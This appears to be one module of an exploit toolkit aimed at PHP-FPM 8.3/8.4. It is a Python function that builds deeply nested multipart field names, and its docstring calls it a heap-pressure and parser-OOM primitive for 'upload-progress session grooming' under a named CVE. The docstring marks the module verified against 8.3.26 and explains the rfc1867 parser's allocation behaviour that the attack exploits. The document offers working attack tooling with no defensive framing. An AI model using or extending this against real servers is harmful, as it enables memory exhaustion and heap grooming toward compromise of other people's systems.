# INDEX: build deeply-nested multipart heap-pressure fields | fpm
"""Deeply-nested multipart field builder: a heap-pressure / parser-OOM primitive for
upload-progress session grooming (CVE-2026-109619).

Mechanism (ext/standard/rfc1867.c, main/php_variables.c; php-src 8.3/8.4):
  A multipart part named prefix{k}[a][a]... (levels deep) with an empty value makes the rfc1867
  parser build a chain of nested HashTables for $_FILES/$_POST; a batch drives the parse-peak
  allocation up sharply (~45-52 KB transient per field on 8.3.x). filename=b"" yields empty-filename
  $_FILES parts (the parser-OOM wall); filename=None yields plain $_POST fields. The empty value is
  deliberate -- the cost is in the nested name.

API:
  nested_fields(prefix, count, levels=60, filename=None) -> list of (name, value, filename) tuples
    for the caller's multipart transport.

Tested: 8.3.26-fpm.
Stage: VERIFIED 8.3.26.
"""
LEVELS = 60


def nested_fields(prefix, count, levels=LEVELS, filename=None):
    """`count` deeply-nested parts named prefix{k} + '[a]'*levels with empty values.

    filename=None -> plain $_POST fields; filename=b"" -> empty-filename $_FILES wall parts.
    Returns (name, value, filename) tuples."""
    lvl = b"[a]" * levels
    return [(prefix + b"%d" % k + lvl, b"", filename) for k in range(count)]
